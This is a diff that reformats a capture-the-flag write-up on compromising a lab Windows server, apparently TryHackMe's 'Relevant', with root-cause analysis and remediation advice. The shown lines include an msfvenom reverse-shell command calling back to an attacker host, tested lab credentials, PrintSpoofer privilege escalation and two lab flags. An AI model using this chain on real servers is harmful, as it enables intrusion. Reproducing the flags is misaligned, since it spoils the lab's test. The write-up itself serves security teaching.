@@ -9,11 +9,11 @@ This document is a structured security write-up based on hands-on exploitation o
 
 ## Summary
 
-Standalone web server "Relevant" was fully compromised by the next few steps:  
-* Share "nt4wrksv" is writable for any anonymous in smbclient — it's easy Remote Code Execution.
-* Remote Code Execution -> Reverse Shell -> full ability of machine movement for a hacker and full ability of privilege escalation vector research — comfortable and easy POST work for a hacker.
-* Critical Windows server misconfiguration — user "iis apppool\defaultapppool" has privilege "SeImpersonatePrivilege", what means a hacker can run thing called "PrintSpoofer" and get SYSTEM (full access to the server) easy and fast.
-* As result — a hacker got SYSTEM and standalone web server "Relevant" was fully compromised.
+Standalone web server **"Relevant"** was fully compromised by the next **few steps**:  
+* Share **"nt4wrksv"** is writable for **any** anonymous in smbclient — it's easy **Remote Code Execution**.
+* Remote Code Execution -> **Reverse Shell** -> full ability of machine movement for a hacker and full ability of privilege escalation vector research — comfortable and **easy POST work** for a hacker.
+* **Critical** Windows server **misconfiguration** — user **"iis apppool\defaultapppool"** has privilege **"SeImpersonatePrivilege"**, what means a hacker can run **"PrintSpoofer"** and get a **SYSTEM** (full access to the server) easy and fast.
+* **As result** — a hacker got the **SYSTEM** and standalone web server "Relevant" was **fully compromised**.
 
 ---
 
@@ -72,7 +72,7 @@ Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ---
 
-Look for http port 80:  
+Look for **http** port 80:  
 * **http://10.80.131.73** — stock Windows Server 2016 web page, nothing interesting in there.
 
 Check it out with fuzzing:  
@@ -141,7 +141,7 @@ Verify Bob's credentials:
 $ nxc smb 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
 ```
 
-Bob positive:  
+Bob **positive**:  
 ```text
 [+] Relevant\Bob:!P@$$W0rD!123
 ```
@@ -152,7 +152,7 @@ Verify Bill's credentials:
 $ nxc smb 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
 ```
 
-Bill positive:  
+Bill **positive**:  
 ```text
 [+] Relevant\Bill:Juw4nnaM4n420696969!$$$ (Guest)
 ```
@@ -169,7 +169,7 @@ $ nxc rdp 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
 $ nxc rdp 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
 ```
 
-No RDP for both.
+**No RDP** for both.
 
 **But there is one critical thing — we can write in the share "nt4wrksv" as anonymous, that means no account required for RCE.**
 
@@ -201,11 +201,12 @@ whoami
 
 ---
 
-Create reverse shell via msfvenom:  
+Create **reverse shell** via msfvenom:  
 ```bash
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.226 LPORT=4444 -f aspx -o shell.aspx
 ```
-Then move shell.aspx -> smbclient:
+
+Then move **shell.aspx** -> smbclient:
 
 ```powershell
 > put shell.aspx
@@ -217,7 +218,7 @@ Then move shell.aspx -> smbclient:
 c:\Users\Bob\Desktop>type user.txt
 ```
 
-User Flag:  
+**User Flag**:  
 ```text
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
@@ -248,7 +249,7 @@ output.txt:
 Privilege "SeImpersonatePrivilege" is Enabled
 ```
 
-*We can run "PrintSpoofer" and get SYSTEM via "potato" vector.*
+*We can run "PrintSpoofer" and get the SYSTEM via "potato" vector.*
 
 ---
 
@@ -292,27 +293,27 @@ THM{1fk5kf469devly1gl320zafgl345pv}
 
 ## Security Failures & Root Causes Classification
 
-* Access Control — Anonymous Write Access on SMB Share — Critical impact — The nt4wrksv share was configured with "Full Control" or "Write" permissions for anonymous/guest users, allowing the upload of malicious .aspx payloads.
-* Improper Authorization — Excessive Service Account Privileges — High impact — The "iis apppool\defaultapppool" account held SeImpersonatePrivilege, which is unnecessary for standard web operations and enables token impersonation attacks.
-* Information Disclosure — Cleartext/Base64 Credentials in Share — Medium impact — Sensitive data (passwords.txt) was stored in a publicly accessible directory — Base64 is an encoding, not encryption, providing no security.
-* Configuration Management — Insecure Default IIS Deployment — Medium impact — The web server was running with default configurations and mapping high-numbered ports (49663) to sensitive SMB directories, increasing the attack surface.
+* **Access Control** — Anonymous Write Access on SMB Share — **Critical** impact — The "nt4wrksv" share was configured with "Full Control" or "Write" permissions for anonymous/guest users, allowing the upload of malicious .aspx payloads.
+* **Improper Authorization** — Excessive Service Account Privileges — **High** impact — The "iis apppool\defaultapppool" account held "SeImpersonatePrivilege", which is unnecessary for standard web operations and enables token impersonation attacks.
+* **Information Disclosure** — Cleartext/Base64 Credentials in Share — **Medium** impact — Sensitive data (passwords.txt) was stored in a publicly accessible directory — Base64 is an encoding, not encryption, providing no security.
+* **Configuration Management** — Insecure Default IIS Deployment — **Medium** impact — The web server was running with default configurations and mapping high-numbered ports (49663) to sensitive SMB directories, increasing the attack surface.
 
 ---
 
 ## Remediation Recommendations
 
-* Disable anonymous/guest access on all SMB shares
-* Remove SeImpersonatePrivilege from service accounts where not strictly required
-* Implement Group Managed Service Accounts (gMSAs) to handle service permissions securely
-* Enforce strict NTFS permissions to prevent web-writable directories
-* Prohibit cleartext or encoded credential storage in shared folders
-* Audit privilege assignments regularly to prevent privilege creep on default app pools
+* **Disable** anonymous/guest access on all SMB shares.
+* **Remove** "SeImpersonatePrivilege" from service accounts where not strictly required.
+* **Implement** Group Managed Service Accounts (gMSAs) to handle service permissions securely.
+* **Enforce** strict NTFS permissions to prevent web-writable directories.
+* **Prohibit** cleartext or encoded credential storage in shared folders.
+* **Audit** privilege assignments regularly to prevent privilege creep on default app pools.
 
 ---
 
 ## Conclusion
 
-> This lab demonstrates how misconfiguration beats exploitation. No sophisticated malware or memory corruption was required—only the abuse of over-privileged trust relationships and weak operational discipline. By exposing a writable SMB share and granting a web service account unnecessary impersonation rights, the server provided a clear, repeatable path from anonymous access to full SYSTEM compromise. This attack path is a realistic and devastating reminder that security is only as strong as its most basic configuration.
+> This lab demonstrates how misconfiguration beats exploitation. No sophisticated malware or memory corruption was required — only the abuse of over-privileged trust relationships and weak operational discipline. By exposing a writable SMB share and granting a web service account unnecessary impersonation rights, the server provided a clear, repeatable path from anonymous access to full SYSTEM compromise. This attack path is a realistic and devastating reminder that security is only as strong as its most basic configuration.
 
 ---
 
